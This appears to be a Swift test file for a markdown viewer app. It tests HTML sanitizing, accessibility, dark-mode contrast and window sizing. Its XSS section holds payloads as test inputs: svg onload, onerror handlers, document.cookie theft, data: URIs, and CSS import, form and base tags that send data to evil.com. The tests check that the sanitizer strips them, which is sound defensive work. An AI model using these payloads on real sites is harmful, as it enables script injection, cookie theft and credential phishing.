runner.test("sanitizer strips object/embed tags") {
    let html = "<object data=\"evil.swf\"></object><embed src=\"evil.swf\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<object"), "Should strip object tags")
    try expect(!clean.contains("<embed"), "Should strip embed tags")
}

runner.test("sanitizer preserves safe HTML") {
    let html = try loadPluginFixture("html/safe.html")
    let clean = sanitizer.sanitize(html)
    try expect(clean.contains("<h1>Hello World</h1>"), "Should preserve h1")
    try expect(clean.contains("<strong>bold</strong>"), "Should preserve bold")
    try expect(clean.contains("<li>Item 1</li>"), "Should preserve list items")
}

// Fixture-based sanitizer tests

runner.test("sanitizer: xss-attempt fixture is fully cleaned") {
    let html = try loadPluginFixture("html/xss-attempt.html")
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<script"), "No script tags should remain")
    try expect(!clean.contains("javascript:"), "No javascript: URIs should remain")
    try expect(!clean.contains("onerror"), "No event handlers should remain")
    try expect(!clean.contains("<iframe"), "No iframes should remain")
    try expect(clean.contains("Normal text"), "Safe content should remain")
}

runner.test("sanitizer: event-handlers fixture is cleaned") {
    let html = try loadPluginFixture("html/event-handlers.html")
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onclick"), "Should strip onclick")
    try expect(!clean.contains("onmouseover"), "Should strip onmouseover")
    try expect(!clean.contains("onload"), "Should strip onload")
    try expect(!clean.contains("onerror"), "Should strip onerror")
    try expect(clean.contains("Safe content"), "Should preserve safe content")
}

// =============================================================================
// XSS Bypass Vector Tests (Security Audit)
// =============================================================================

print("\n=== XSS Bypass Vector Tests ===")

// --- Vector 1: SVG tags ---

runner.test("sanitizer strips svg onload XSS") {
    let html = "<p>Safe</p><svg onload=alert(1)></svg><p>After</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg tags")
    try expect(!clean.contains("onload"), "Should strip onload handler")
    try expect(!clean.contains("alert"), "Should strip JS payload")
    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips svg with nested content") {
    let html = "<svg><circle r=\"50\"/><animate onbegin=\"alert(1)\"/></svg>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg tags")
    try expect(!clean.contains("animate"), "Should strip svg child elements")
}

runner.test("sanitizer strips SVG case-insensitive") {
    let html = "<SVG ONLOAD=alert(1)></SVG>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<SVG"), "Should strip uppercase SVG tags")
}

// --- Vector 2: Style tag injection ---

runner.test("sanitizer strips style tags with CSS exfiltration") {
    let html = "<p>Safe</p><style>@import url('https://evil.com/steal?data=secret')</style>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<style"), "Should strip style tags")
    try expect(!clean.contains("@import"), "Should strip CSS import")
    try expect(!clean.contains("evil.com"), "Should strip malicious URL")
    try expect(clean.contains("<p>Safe</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips style tags with expression") {
    let html = "<style>body { background: url('https://tracker.com/pixel') }</style>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<style"), "Should strip style tags")
    try expect(!clean.contains("tracker.com"), "Should strip tracking URL")
}

runner.test("sanitizer strips STYLE case-insensitive") {
    let html = "<STYLE>body{color:red}</STYLE>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<STYLE"), "Should strip uppercase STYLE tags")
}

// --- Vector 3: Unquoted event handlers ---

runner.test("sanitizer strips unquoted onerror") {
    let html = "<img src=x onerror=alert(1)>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
    try expect(!clean.contains("alert"), "Should strip JS payload")
}

runner.test("sanitizer strips unquoted onload") {
    let html = "<body onload=alert(1)>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onload"), "Should strip unquoted onload")
}

runner.test("sanitizer strips unquoted onmouseover") {
    let html = "<div onmouseover=alert(document.cookie)>Hover me</div>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onmouseover"), "Should strip unquoted onmouseover")
    try expect(!clean.contains("document.cookie"), "Should strip cookie theft payload")
}

runner.test("sanitizer strips mixed quoted and unquoted handlers") {
    let html = "<img src=\"valid.png\" onerror=alert(1) onclick=\"steal()\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onerror"), "Should strip unquoted onerror")
    try expect(!clean.contains("onclick"), "Should strip quoted onclick")
    try expect(!clean.contains("alert"), "Should strip JS from unquoted handler")
    try expect(!clean.contains("steal"), "Should strip JS from quoted handler")
}

// --- Vector 4: Base tag injection ---

runner.test("sanitizer strips base tag") {
    let html = "<base href=\"https://evil.com/\"><a href=\"/login\">Login</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<base"), "Should strip base tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious base URL")
    try expect(clean.contains("<a href=\"/login\">Login</a>"), "Should preserve relative links")
}

runner.test("sanitizer strips self-closing base tag") {
    let html = "<base href=\"https://evil.com/\" />"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<base"), "Should strip self-closing base tags")
}

runner.test("sanitizer strips BASE case-insensitive") {
    let html = "<BASE HREF=\"https://evil.com/\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<BASE"), "Should strip uppercase BASE tags")
}

// --- Vector 5: Form/input tag injection (phishing) ---

runner.test("sanitizer strips form tags") {
    let html = "<form action=\"https://evil.com/steal\"><input type=\"password\" name=\"pw\"><input type=\"submit\" value=\"Login\"></form>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<form"), "Should strip form tags")
    try expect(!clean.contains("<input"), "Should strip input tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious action URL")
}

runner.test("sanitizer strips standalone input tags") {
    let html = "<p>Enter password:</p><input type=\"password\" name=\"pw\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<input"), "Should strip input tags")
    try expect(clean.contains("<p>Enter password:</p>"), "Should preserve paragraph")
}

runner.test("sanitizer strips textarea tags") {
    let html = "<textarea name=\"data\">Prefilled content</textarea>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<textarea"), "Should strip textarea tags")
}

runner.test("sanitizer strips button tags") {
    let html = "<button type=\"submit\">Submit</button>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<button"), "Should strip button tags")
}

runner.test("sanitizer strips select tags") {
    let html = "<select name=\"choice\"><option>A</option><option>B</option></select>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<select"), "Should strip select tags")
}

// --- Vector 6: Link tags ---

runner.test("sanitizer strips link tags") {
    let html = "<link rel=\"stylesheet\" href=\"https://evil.com/steal.css\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<link"), "Should strip link tags")
    try expect(!clean.contains("evil.com"), "Should strip malicious stylesheet URL")
}

runner.test("sanitizer strips link with prefetch") {
    let html = "<link rel=\"prefetch\" href=\"https://evil.com/track\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<link"), "Should strip prefetch link tags")
}

runner.test("sanitizer strips LINK case-insensitive") {
    let html = "<LINK REL=\"stylesheet\" HREF=\"https://evil.com/steal.css\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<LINK"), "Should strip uppercase LINK tags")
}

// --- Vector 7: data: URI scheme ---

runner.test("sanitizer blocks data URI in href") {
    let html = "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("\"data:"), "Should block data: URI")
    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
}

runner.test("sanitizer blocks data URI in img src") {
    let html = "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("\"data:"), "Should block data: URI in img")
    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
}

runner.test("sanitizer blocks DATA URI case-insensitive") {
    let html = "<a href=\"DATA:text/html,<script>alert(1)</script>\">Click</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("\"DATA:"), "Should block uppercase DATA: URI")
    try expect(clean.contains("blocked-data:"), "Should replace with blocked-data:")
}

// --- Vector 8: Math tags ---

runner.test("sanitizer strips math tags") {
    let html = "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></mtext></math>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<math"), "Should strip math tags")
}

runner.test("sanitizer strips MATH case-insensitive") {
    let html = "<MATH><MTEXT>payload</MTEXT></MATH>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<MATH"), "Should strip uppercase MATH tags")
}

// --- Combined / edge cases ---

runner.test("sanitizer handles multiple vectors in one payload") {
    let html = "<svg onload=alert(1)></svg><style>@import url(evil)</style><base href=\"https://evil.com\"><form><input type=password></form><link rel=stylesheet href=evil.css>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg")
    try expect(!clean.contains("<style"), "Should strip style")
    try expect(!clean.contains("<base"), "Should strip base")
    try expect(!clean.contains("<form"), "Should strip form")
    try expect(!clean.contains("<input"), "Should strip input")
    try expect(!clean.contains("<link"), "Should strip link")
}

runner.test("sanitizer preserves safe HTML after stripping dangerous content") {
    let html = "<h1>Title</h1><svg onload=alert(1)></svg><p>Paragraph with <strong>bold</strong> text.</p><style>body{display:none}</style><ul><li>Item</li></ul>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<svg"), "Should strip svg")
    try expect(!clean.contains("<style"), "Should strip style")
    try expect(clean.contains("<h1>Title</h1>"), "Should preserve h1")
    try expect(clean.contains("<strong>bold</strong>"), "Should preserve strong")
    try expect(clean.contains("<li>Item</li>"), "Should preserve list items")
}

// HTML plugin integration

runner.test("HTML plugin sanitizes by default") {
    let plugin = HTMLPlugin()
    let html = "<p>Hello</p><script>alert('xss')</script>"
    let result = plugin.render(source: html)
    try expect(!result.contains("<script"), "HTML plugin should sanitize")
    try expect(result.contains("<p>Hello</p>"), "Should preserve safe content")
    try expect(!plugin.requiresJSExecution, "HTML plugin should not require JS (sanitized)")
}

runner.test("All enums have non-empty IDs via rawValue") {
    for theme in TestAppTheme.allCases {
        try expect(!theme.rawValue.isEmpty, "AppTheme rawValue should not be empty")
    }
    for width in TestPreviewWidth.allCases {
        try expect(!width.rawValue.isEmpty, "PreviewWidth rawValue should not be empty")
    }
    for tab in TestTabBehavior.allCases {
        try expect(!tab.rawValue.isEmpty, "TabBehavior rawValue should not be empty")
    }
}

// =============================================================================
// MARK: - Accessibility (A11Y) Tests
// =============================================================================

print("\n=== Accessibility Tests ===")

runner.test("inline template has article with role=document") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    try expect(full.contains("role=\"document\""), "Missing role=document on article")
    try expect(full.contains("aria-label=\"Rendered markdown content\""), "Missing aria-label on article")
}

runner.test("postProcessForAccessibility adds table role") {
    let html = "<table><tr><th>Name</th></tr><tr><td>Alice</td></tr></table>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("<table role=\"table\">"), "Missing role=table")
}

runner.test("postProcessForAccessibility adds scope=col to th") {
    let html = "<table><tr><th>Name</th><th align=\"center\">Age</th></tr></table>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("scope=\"col\"") && processed.contains("<th"), "Missing scope=col on th")
    try expect(processed.contains("align=\"center\""), "Missing alignment on aligned th")
}

runner.test("postProcessForAccessibility adds aria-label to code blocks") {
    let html = "<pre><code class=\"language-swift\">let x = 1</code></pre>"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("<pre aria-label=\"Code block\">"), "Missing aria-label on pre")
}

runner.test("postProcessForAccessibility adds aria-label to task checkboxes") {
    let html = "<input type=\"checkbox\" checked=\"\" disabled=\"\"> Done"
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("aria-label=\"Task item\""), "Missing aria-label on checkbox")
}

runner.test("postProcessForAccessibility on GFM table fixture") {
    let md = "| Name | Age |\n|------|-----|\n| Alice | 30 |"
    let html = MarkdownRenderer.renderHTML(from: md)
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("role=\"table\""), "Fixture table missing role")
    try expect(processed.contains("scope=\"col\""), "Fixture th missing scope")
}

runner.test("postProcessForAccessibility on task list fixture") {
    let md = "- [x] Done\n- [ ] Not done"
    let html = MarkdownRenderer.renderHTML(from: md)
    let processed = MarkdownRenderer.postProcessForAccessibility(html)
    try expect(processed.contains("aria-label=\"Task item\""), "Task checkboxes missing aria-label")
}

// MARK: - Focus CSS Tests

print("\n=== Focus CSS Tests ===")

runner.test("template has :focus-visible styles") {
    // Read template.html from disk
    let cwd = FileManager.default.currentDirectoryPath
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let template = try String(contentsOf: templatePath, encoding: .utf8)
    try expect(template.contains(":focus-visible"), "template.html missing :focus-visible CSS")
    try expect(template.contains("outline:") || template.contains("outline-color:"), "template.html missing focus outline style")
}

runner.test("dark mode has focus outline color") {
    let cwd = FileManager.default.currentDirectoryPath
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let template = try String(contentsOf: templatePath, encoding: .utf8)

    guard let darkStart = template.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query in template.html")
    }
    let afterDark = String(template[darkStart.upperBound...])
    try expect(afterDark.contains(":focus-visible") && afterDark.contains("outline-color"),
              "Dark mode missing focus outline color override")
}

// MARK: - Internationalization (I18N) Tests

print("\n=== Internationalization Tests ===")

runner.test("template has lang attribute") {
    let cwd = FileManager.default.currentDirectoryPath
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let template = try String(contentsOf: templatePath, encoding: .utf8)
    try expect(template.contains("<html lang=\"en\">"), "template.html missing lang=en attribute")
}

runner.test("inline template has lang attribute") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    try expect(full.contains("<html lang=\"en\">"), "Inline template missing lang=en attribute")
}

runner.test("RTL CSS rules exist in template") {
    let cwd = FileManager.default.currentDirectoryPath
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let template = try String(contentsOf: templatePath, encoding: .utf8)
    try expect(template.contains("[dir=\"rtl\"]"), "template.html missing RTL CSS rules")
    try expect(template.contains("[dir=\"rtl\"] blockquote"), "template.html missing RTL blockquote rule")
    try expect(template.contains("[dir=\"rtl\"] ul"), "template.html missing RTL list rule")
}

runner.test("all user-facing strings use Strings enum") {
    // Grep SwiftUI view files for bare string literals that should be in Strings enum.
    // We check for common patterns that indicate a user-facing string NOT using Strings.X
    let cwd = FileManager.default.currentDirectoryPath
    let viewFiles = [
        "Sources/MarkView/ContentView.swift",
        "Sources/MarkView/StatusBarView.swift",
        "Sources/MarkView/EditorView.swift",
        "Sources/MarkView/MarkViewApp.swift",
    ]

    var violations: [String] = []
    for file in viewFiles {
        let path = URL(fileURLWithPath: cwd).appendingPathComponent(file)
        guard let content = try? String(contentsOf: path, encoding: .utf8) else { continue }
        let lines = content.components(separatedBy: "\n")
        for (i, line) in lines.enumerated() {
            let trimmed = line.trimmingCharacters(in: .whitespaces)
            // Skip comments, imports, struct/class/func declarations
            if trimmed.hasPrefix("//") || trimmed.hasPrefix("import") || trimmed.isEmpty { continue }
            // Check for Button("literal"), Text("literal"), .help("literal"), .alert("literal")
            // These should use Strings.X instead
            let patterns = [
                "Button(\"", "Text(\"", ".help(\"", ".alert(\"",
                ".accessibilityLabel(\"", ".accessibilityHint(\""
            ]
            for pattern in patterns {
                if trimmed.contains(pattern) {
                    // Allow Text() in format strings like Text("\(value)pt")
                    // Allow .help() that just wraps a Strings reference
                    let afterPattern = trimmed.components(separatedBy: pattern).dropFirst().joined()
                    if afterPattern.hasPrefix("\\(") { continue }
                    violations.append("\(URL(fileURLWithPath: file).lastPathComponent):\(i+1): \(trimmed.prefix(80))")
                }
            }
        }
    }

    if !violations.isEmpty {
        let report = violations.prefix(5).joined(separator: "\n  ")
        throw TestError.assertionFailed("Found \(violations.count) bare string literals (should use Strings.X):\n  \(report)")
    }
}

// =============================================================================
// MARK: - Dark Mode Explicit Color Regression Tests
// =============================================================================
// These tests prevent the bug where dark mode elements relied on CSS color
// inheritance from body, which fails in WKWebView. Every visible element
// MUST have an explicit color property in dark mode CSS.

print("\n=== Dark Mode Explicit Color Regression ===")

/// Parse dark mode CSS from a full HTML document and return selector → properties map.
func extractDarkModeRules(from html: String) -> [String: [String: String]] {
    let css = extractCSS(from: html)
    let (_, darkCSS) = splitLightDarkCSS(css)
    let rules = parseCSSRules(darkCSS)
    var result: [String: [String: String]] = [:]
    for rule in rules {
        result[rule.selector] = rule.properties
    }
    return result
}

/// Elements that display text and MUST have explicit color in dark mode.
/// Relying on body color inheritance is fragile in WKWebView.
let requiredExplicitColorSelectors = [
    ("body", "body text"),
    ("code:not([class*=\"language-\"])", "inline code"),
    ("th, td", "table cells"),
    ("pre", "code blocks"),
    ("h1, h2, h3, h4, h5", "headings"),
]

runner.test("inline template: all text elements have explicit dark color") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let darkRules = extractDarkModeRules(from: full)

    var missing: [String] = []
    for (selector, description) in requiredExplicitColorSelectors {
        let props = darkRules[selector] ?? [:]
        if props["color"] == nil {
            missing.append("\(selector) (\(description))")
        }
    }

    if !missing.isEmpty {
        throw TestError.assertionFailed(
            "Dark mode missing explicit color on \(missing.count) text elements " +
            "(DO NOT rely on inheritance from body):\n  " +
            missing.joined(separator: "\n  ")
        )
    }
}

runner.test("template.html: all text elements have explicit dark color") {
    let cwd = FileManager.default.currentDirectoryPath
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let template = try String(contentsOf: templatePath, encoding: .utf8)
    let darkRules = extractDarkModeRules(from: template)

    var missing: [String] = []
    for (selector, description) in requiredExplicitColorSelectors {
        let props = darkRules[selector] ?? [:]
        if props["color"] == nil {
            missing.append("\(selector) (\(description))")
        }
    }

    if !missing.isEmpty {
        throw TestError.assertionFailed(
            "template.html dark mode missing explicit color on \(missing.count) text elements " +
            "(DO NOT rely on inheritance from body):\n  " +
            missing.joined(separator: "\n  ")
        )
    }
}

runner.test("WebPreviewView darkModeCSS: all text elements have explicit color") {
    // Read WebPreviewView.swift and extract the darkModeCSS constant
    let cwd = FileManager.default.currentDirectoryPath
    let wpvPath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/WebPreviewView.swift")
    let source = try String(contentsOf: wpvPath, encoding: .utf8)

    // Extract the darkModeCSS array content from source
    guard let darkStart = source.range(of: "private static let darkModeCSS = ["),
          let darkEnd = source.range(of: "].joined(separator:", range: darkStart.upperBound..<source.endIndex) else {
        throw TestError.assertionFailed("Could not find darkModeCSS constant in WebPreviewView.swift")
    }
    let darkCSSSource = String(source[darkStart.upperBound..<darkEnd.lowerBound])
    // Unescape Swift string escapes to get the actual CSS
    let darkCSS = darkCSSSource
        .replacingOccurrences(of: "\\\"", with: "\"")
        .replacingOccurrences(of: "\\n", with: "\n")

    for (selector, description) in requiredExplicitColorSelectors {
        // Find the CSS rule string for this selector
        guard let ruleStart = darkCSS.range(of: "\(selector) {") else {
            throw TestError.assertionFailed("darkModeCSS missing selector: \(selector) (\(description))")
        }
        let afterSelector = String(darkCSS[ruleStart.upperBound...])
        guard let ruleEndIdx = afterSelector.firstIndex(of: "}") else { continue }
        let ruleBody = String(afterSelector[afterSelector.startIndex..<ruleEndIdx])
        try expect(ruleBody.contains("color:"),
            "darkModeCSS: \(selector) (\(description)) missing explicit color property — " +
            "DO NOT rely on inheritance from body")
    }
}

runner.test("dark mode CSS is consistent across all 3 locations") {
    // Verify that the key dark mode colors match across template.html,
    // inline template, and WebPreviewView.swift darkModeCSS
    let cwd = FileManager.default.currentDirectoryPath

    // 1. Inline template
    let inlineHTML = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let inlineDark = extractDarkModeRules(from: inlineHTML)

    // 2. template.html
    let templatePath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/Resources/template.html")
    let templateHTML = try String(contentsOf: templatePath, encoding: .utf8)
    let templateDark = extractDarkModeRules(from: templateHTML)

    // Check key selectors match between inline and template
    let criticalSelectors = ["body", "code:not([class*=\"language-\"])", "th, td", "pre"]
    var mismatches: [String] = []

    for sel in criticalSelectors {
        let inlineColor = inlineDark[sel]?["color"]
        let templateColor = templateDark[sel]?["color"]

        if inlineColor != templateColor {
            mismatches.append("\(sel): inline=\(inlineColor ?? "nil") vs template=\(templateColor ?? "nil")")
        }

        let inlineBg = inlineDark[sel]?["background"] ?? inlineDark[sel]?["background-color"]
        let templateBg = templateDark[sel]?["background"] ?? templateDark[sel]?["background-color"]

        if inlineBg != templateBg {
            mismatches.append("\(sel) bg: inline=\(inlineBg ?? "nil") vs template=\(templateBg ?? "nil")")
        }
    }

    if !mismatches.isEmpty {
        throw TestError.assertionFailed(
            "Dark mode CSS inconsistency between inline template and template.html:\n  " +
            mismatches.joined(separator: "\n  ")
        )
    }
}

runner.test("dark mode text contrast >= 4.5:1 for all explicit colors") {
    // WCAG AA requires >= 4.5:1 for normal text
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")
    let darkRules = extractDarkModeRules(from: full)

    // Parse hex color to relative luminance
    func luminance(_ hex: String) -> Double? {
        let h = hex.trimmingCharacters(in: CharacterSet(charactersIn: "#"))
        guard h.count == 6 else { return nil }
        let scanner = Scanner(string: h)
        var rgb: UInt64 = 0
        scanner.scanHexInt64(&rgb)
        let r = Double((rgb >> 16) & 0xFF) / 255.0
        let g = Double((rgb >> 8) & 0xFF) / 255.0
        let b = Double(rgb & 0xFF) / 255.0
        func linearize(_ c: Double) -> Double { c <= 0.03928 ? c / 12.92 : pow((c + 0.055) / 1.055, 2.4) }
        return 0.2126 * linearize(r) + 0.7152 * linearize(g) + 0.0722 * linearize(b)
    }

    func contrastRatio(_ l1: Double, _ l2: Double) -> Double {
        let lighter = max(l1, l2)
        let darker = min(l1, l2)
        return (lighter + 0.05) / (darker + 0.05)
    }

    // Dark background
    let bgHex = "#0d1117"
    guard let bgLum = luminance(bgHex) else {
        throw TestError.assertionFailed("Could not parse background color")
    }

    // Check all elements with explicit color
    var failures: [String] = []
    for (selector, description) in requiredExplicitColorSelectors {
        guard let colorValue = darkRules[selector]?["color"] else { continue }
        // Extract hex color from value (might be "#e6edf3" or "#8b949e" etc)
        let hexPattern = "#[0-9a-fA-F]{6}"
        guard let hexRange = colorValue.range(of: hexPattern, options: .regularExpression),
              let fgLum = luminance(String(colorValue[hexRange])) else { continue }

        let ratio = contrastRatio(fgLum, bgLum)
        if ratio < 4.5 {
            failures.append("\(selector) (\(description)): \(colorValue) on \(bgHex) = \(String(format: "%.1f", ratio)):1 (need >= 4.5:1)")
        }
    }

    if !failures.isEmpty {
        throw TestError.assertionFailed(
            "WCAG AA contrast failures in dark mode:\n  " +
            failures.joined(separator: "\n  ")
        )
    }
}

runner.test("WebPreviewView .system theme injects dark CSS (not just media query)") {
    // Verify that WebPreviewView.swift handles .system theme by detecting
    // the system appearance and injecting darkModeCSS, NOT just relying on
    // @media (prefers-color-scheme: dark) which is unreliable in WKWebView
    let cwd = FileManager.default.currentDirectoryPath
    let wpvPath = URL(fileURLWithPath: cwd).appendingPathComponent("Sources/MarkView/WebPreviewView.swift")
    let source = try String(contentsOf: wpvPath, encoding: .utf8)

    // Find the .system case in injectSettingsCSS
    guard source.contains("case .system:") else {
        throw TestError.assertionFailed("WebPreviewView missing .system case")
    }

    // Verify it does NOT just break/return — it must inject dark CSS conditionally
    // Look for the pattern: case .system followed by dark mode detection
    try expect(
        source.contains("systemIsDarkMode") || source.contains("effectiveAppearance"),
        "WebPreviewView .system theme must detect dark mode and inject CSS explicitly " +
        "(WKWebView @media prefers-color-scheme is unreliable)"
    )

    // Verify webView.appearance is set (so media query works as backup)
    try expect(
        source.contains("webView.appearance"),
        "WebPreviewView must set webView.appearance to sync with system theme"
    )
}

// =============================================================================
// MARK: - Window Sizing Tests
// =============================================================================
// Validates the window sizing logic used by MarkViewApp and ContentView.
// Tests the computation (screen percentages, minimums, centering) without requiring
// a running window — ensures sizing regressions are caught automatically.

print("\n=== Window Sizing Tests ===")

// Simulate the sizing functions extracted from MarkViewApp/ContentView
struct WindowSizingSpec {
    /// Preview-only mode: 55% width, 85% height
    static func previewOnlySize(screenWidth: CGFloat, screenHeight: CGFloat) -> (width: CGFloat, height: CGFloat) {
        let w = max(screenWidth * 0.55, 800)
        let h = max(screenHeight * 0.85, 600)
        return (w, h)
    }

    /// Editor+preview mode: 80% width
    static func editorPreviewWidth(screenWidth: CGFloat) -> CGFloat {
        max(screenWidth * 0.80, 900)
    }

    /// Toggle sizing: returns target width for mode
    static func toggleTargetWidth(screenWidth: CGFloat, showEditor: Bool) -> CGFloat {
        if showEditor {
            return max(screenWidth * 0.80, 900)
        } else {
            return max(screenWidth * 0.55, 800)
        }
    }

    /// Center a window of given width on screen
    static func centeredX(screenOriginX: CGFloat, screenWidth: CGFloat, windowWidth: CGFloat) -> CGFloat {
        screenOriginX + (screenWidth - windowWidth) / 2
    }
}

// Read source files to validate constants match
let appSource = try! String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
let contentSource = try! String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)

runner.test("preview-only default: 55% screen width on standard display") {
    let (w, h) = WindowSizingSpec.previewOnlySize(screenWidth: 1920, screenHeight: 1080)
    try expect(w == 1056, "expected 1056, got \(w)")
    try expect(h == 918, "expected 918, got \(h)")
}

runner.test("preview-only default: min 800 kicks in on laptop display") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 1440, screenHeight: 900)
    // 1440*0.55=792 < 800, so min kicks in
    try expect(w == 800, "expected 800 (min), got \(w)")
}

runner.test("preview-only minimum width: 800px on small screens") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 1200, screenHeight: 800)
    // 1200 * 0.55 = 660, min 800 kicks in
    try expect(w == 800, "expected 800 minimum, got \(w)")
}

runner.test("preview-only minimum height: 600px on small screens") {
    let (_, h) = WindowSizingSpec.previewOnlySize(screenWidth: 1200, screenHeight: 600)
    // 600 * 0.85 = 510, min 600 kicks in
    try expect(h == 600, "expected 600 minimum, got \(h)")
}

runner.test("editor+preview: 80% screen width on standard display") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 1920)
    try expect(w == 1536, "expected 1536, got \(w)")
}

runner.test("editor+preview minimum width: 900px on small screens") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 1000)
    // 1000 * 0.80 = 800, min 900 kicks in
    try expect(w == 900, "expected 900 minimum, got \(w)")
}

runner.test("editor+preview is always wider than preview-only") {
    for screenWidth: CGFloat in [1000, 1200, 1440, 1920, 2560, 3840] {
        let previewWidth = WindowSizingSpec.toggleTargetWidth(screenWidth: screenWidth, showEditor: false)
        let editorWidth = WindowSizingSpec.toggleTargetWidth(screenWidth: screenWidth, showEditor: true)
        try expect(editorWidth > previewWidth,
            "editor (\(editorWidth)) must be wider than preview (\(previewWidth)) at screen \(screenWidth)")
    }
}

runner.test("toggle to editor widens, toggle back narrows") {
    let screen: CGFloat = 1920
    let previewW = WindowSizingSpec.toggleTargetWidth(screenWidth: screen, showEditor: false)
    let editorW = WindowSizingSpec.toggleTargetWidth(screenWidth: screen, showEditor: true)
    try expect(editorW > previewW, "editor should be wider")
    try expect(editorW / previewW > 1.3, "editor should be at least 30% wider than preview-only")
}

runner.test("window centering calculation") {
    let x = WindowSizingSpec.centeredX(screenOriginX: 0, screenWidth: 1920, windowWidth: 1056)
    try expect(x == 432, "expected centered at 432, got \(x)")
}

runner.test("window centering with screen offset (multi-monitor)") {
    let x = WindowSizingSpec.centeredX(screenOriginX: -1920, screenWidth: 1920, windowWidth: 1056)
    try expect(x == -1488, "expected centered at -1488 on secondary monitor, got \(x)")
}

runner.test("ultra-wide screen: preview-only doesn't stretch too wide") {
    let (w, _) = WindowSizingSpec.previewOnlySize(screenWidth: 3440, screenHeight: 1440)
    // 3440 * 0.55 = 1892 — wide but reasonable (use tolerance for floating point)
    try expect(abs(w - 1892) < 1, "expected ~1892, got \(w)")
    try expect(w < 2000, "preview-only should stay under 2000px even on ultra-wide")
}

runner.test("ultra-wide screen: editor+preview uses 80%") {
    let w = WindowSizingSpec.editorPreviewWidth(screenWidth: 3440)
    try expect(w == 2752, "expected 2752, got \(w)")
}

// Source code validation — ensure the percentages in code match our test spec
runner.test("MarkViewApp.swift uses 0.55 for preview-only width") {
    try expect(appSource.contains("width * 0.55"), "MarkViewApp must use 0.55 for preview-only width fraction")
}

runner.test("MarkViewApp.swift uses min width 800 for preview-only") {
    try expect(appSource.contains("0.55, 800") || appSource.contains("0.55, 800)"),
        "MarkViewApp must use 800 min width for preview-only")
}

runner.test("ContentView.swift uses 0.80 for editor+preview width") {
    try expect(contentSource.contains("0.80") || contentSource.contains("0.8"),
        "ContentView must use 0.80 for editor+preview width fraction")
}

runner.test("ContentView.swift uses 0.55 for preview-only width") {
    try expect(contentSource.contains("0.55"),
        "ContentView must use 0.55 for preview-only width fraction")
}

runner.test("ContentView.swift has min 900 for editor mode") {
    try expect(contentSource.contains("900"),
        "ContentView must enforce 900px minimum for editor+preview")
}

